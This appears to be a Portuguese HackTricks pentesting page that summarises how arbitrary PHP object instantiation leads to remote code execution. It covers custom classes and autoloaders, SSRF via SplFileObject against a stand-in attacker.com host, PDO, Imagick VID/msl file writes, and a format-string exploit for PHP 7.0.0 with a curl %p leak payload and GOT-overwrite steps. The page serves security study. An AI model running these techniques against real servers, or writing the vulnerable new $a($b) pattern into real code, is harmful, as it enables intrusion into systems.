# PHP - RCE abusing object creation: new $_GET["a"]($_GET["b"])

{{#include ../../../banners/hacktricks-training.md}}

Isto é basicamente um resumo de [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Introdução

A criação de objetos arbitrários, como `new $_GET["a"]($_GET["a"])`, pode levar a Remote Code Execution (RCE), conforme detalhado em um [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Este documento destaca várias estratégias para alcançar RCE.

## RCE via Classes Personalizadas ou Autoloading

A sintaxe `new $a($b)` é usada para instanciar um objeto onde **`$a`** representa o nome da classe e **`$b`** é o primeiro argumento passado ao construtor. Essas variáveis podem ser originadas de entradas do usuário como GET/POST, onde podem ser strings ou arrays, ou de JSON, onde podem aparecer como outros tipos.

Considere o trecho de código abaixo:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
Neste caso, definir `$a` para `App` ou `App2` e `$b` para um comando do sistema (por exemplo, `uname -a`) resulta na execução desse comando.

**Funções de carregamento automático** podem ser exploradas se tais classes não estiverem diretamente acessíveis. Essas funções carregam automaticamente classes de arquivos quando necessário e são definidas usando `spl_autoload_register` ou `__autoload`:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
O comportamento do autoloading varia entre versões do PHP, oferecendo diferentes possibilidades de RCE.

## RCE via Classes integradas

Na ausência de classes customizadas ou autoloaders, **built-in PHP classes** podem ser suficientes para RCE. O número dessas classes varia entre 100 e 200, dependendo da versão do PHP e das extensões. Elas podem ser listadas usando `get_declared_classes()`.

Construtores de interesse podem ser identificados através da Reflection API, como mostrado no exemplo a seguir e no link [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**RCE via specific methods includes:**

### **SSRF + Phar Deserialization**

A classe `SplFileObject` possibilita SSRF através de seu construtor, permitindo conexões a qualquer URL:
```php
new SplFileObject('http://attacker.com/');
```
SSRF pode levar a ataques de desserialização em versões do PHP anteriores à 8.0 usando o protocolo Phar.

### **Explorando PDOs**

O construtor da classe PDO permite conexões a bancos de dados via strings DSN, potencialmente possibilitando a criação de arquivos ou outras interações:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Versões do PHP até 5.3.22 e 5.4.12 eram suscetíveis a ataques XXE através dos construtores `SoapClient` e `SimpleXMLElement`, dependendo da versão do libxml2.

## RCE via Extensão Imagick

Na análise das **dependências do projeto**, descobriu-se que **Imagick** poderia ser aproveitado para **execução de comandos** ao instanciar novos objetos. Isso apresenta uma oportunidade para explorar vulnerabilidades.

### VID parser

Foi identificada a capacidade do parser VID de gravar conteúdo em qualquer caminho especificado no sistema de arquivos. Isso pode levar à colocação de um shell PHP em um diretório acessível via web, alcançando Remote Code Execution (RCE).

#### VID Parser + Upload de Arquivo

Observa-se que o PHP armazena temporariamente arquivos enviados em `/tmp/phpXXXXXX`. O parser VID no Imagick, utilizando o protocolo **msl**, pode tratar curingas em caminhos de arquivo, facilitando a transferência do arquivo temporário para um local escolhido. Esse método oferece uma abordagem adicional para gravar arquivos arbitrários no sistema de arquivos.

### PHP Crash + Brute Force

Um método descrito no [**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) envolve o upload de arquivos que causam um crash do servidor antes da exclusão. Ao brute-forcear o nome do arquivo temporário, torna-se possível que o Imagick execute código PHP arbitrário. Contudo, essa técnica foi eficaz apenas em uma versão desatualizada do ImageMagick.

## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)

Quando a entrada do usuário controla o nome da classe (p.ex., `new $_GET['model']()`), o PHP 7.0.0 introduziu um bug transitório durante o refactor do `Throwable` onde o engine tratava erroneamente o nome da classe como uma string de formato do printf durante a resolução. Isso habilita primitivas clássicas do estilo printf dentro do PHP: leaks com `%p`, controle de contagem de escrita com especificadores de largura, e escritas arbitrárias com `%n` contra ponteiros em processo (por exemplo, entradas GOT em builds ELF).

Padrão mínimo de reprodução vulnerável:
```php
<?php
$model = $_GET['model'];
$object = new $model();
```
Resumo da exploração (a partir da referência):
- Leak endereços via `%p` no nome da classe para encontrar um alvo gravável:
```bash
curl "http://host/index.php?model=%p-%p-%p"
# Fatal error includes resolved string with leaked pointers
```
- Use parâmetros posicionais e especificadores de largura para definir um número exato de bytes, depois `%n` para escrever esse valor em um endereço acessível na stack, mirando em um slot da GOT (por exemplo, `free`) para sobrescrevê-lo parcialmente para `system`.
- Dispare a função sequestrada passando um nome de classe contendo um pipe de shell para alcançar `system("id")`.

Notas:
- Funciona apenas no PHP 7.0.0 (Bug [#71105](https://bugs.php.net/bug.php?id=71105)); corrigido nas versões posteriores. Severidade: crítica se existir instanciação arbitrária de classes.
- Payloads típicos encadeiam muitos `%p` para percorrer a stack, depois `%.<width>d%<pos>$n` para provocar a sobrescrição parcial.

## References

- [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../../banners/hacktricks-training.md}}
